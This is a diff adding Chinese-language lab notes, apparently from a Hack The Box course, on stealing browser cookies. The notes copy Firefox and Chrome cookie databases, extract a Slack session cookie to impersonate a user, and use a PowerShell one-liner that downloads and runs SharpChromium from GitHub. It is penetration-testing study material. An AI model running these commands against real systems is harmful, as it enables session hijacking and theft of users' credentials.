@@ -235,3 +235,21 @@ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwS
 
 ***
 Cookies
+**
+Firefox 将 cookies 保存在一个名为 cookies.sqlite 的 SQLite 数据库文件中。该文件位于每个用户的 APPDATA 目录 %APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release
+        C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .                        复制
+        python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d                破解
+                https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
+        https://cookie-editor.com/        修改网页版聊天slack.com的cookie，impersonate
+**
+基于 Chromium 的浏览器也将其 cookies 信息存储在 SQLite 数据库中。唯一的区别是 cookie 值是使用数据保护 API (Data Protection API, DPAPI) 加密的
+C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
+arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
+C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
+        https://github.com/djhohnstein/SharpChromium
+        https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1
+
+SharpChromium 正在 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies 中查找文件，
+但实际文件位于 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies。通过以下命令，我们将文件复制到 SharpChromium 期望的位置。
+C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+C:\htb> Invoke-SharpChromium -Command "cookies slack.com"
